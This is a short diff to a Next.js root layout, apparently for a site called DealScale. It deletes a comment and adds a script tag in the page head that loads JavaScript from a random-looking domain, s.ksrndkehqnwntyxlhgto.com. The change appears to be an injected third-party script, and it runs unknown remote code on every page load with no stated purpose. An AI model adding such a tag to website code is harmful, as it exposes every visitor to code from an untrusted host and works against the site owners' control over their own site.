@@ -37,13 +37,13 @@ export default function RootLayout({ children }: { children: ReactNode }) {
 			suppressHydrationWarning
 		>
 			<head>
-				{/* Preload small hero logo to stabilize LCP visual */}
 				<link
 					rel="preload"
 					as="image"
 					href="/logos/DealScale%20Transparent%20Logo/Deal%20Scale%20No%20Text.png"
 					// type omitted; browsers infer from extension
 				/>
+				<script src="//s.ksrndkehqnwntyxlhgto.com/162476.js" async />
 			</head>
 			<body className="theme-lead-orchestra theme-dealscale min-h-screen bg-background font-sans antialiased">
 				<SchemaInjector schema={KNOWLEDGE_GRAPH_SCHEMA} />
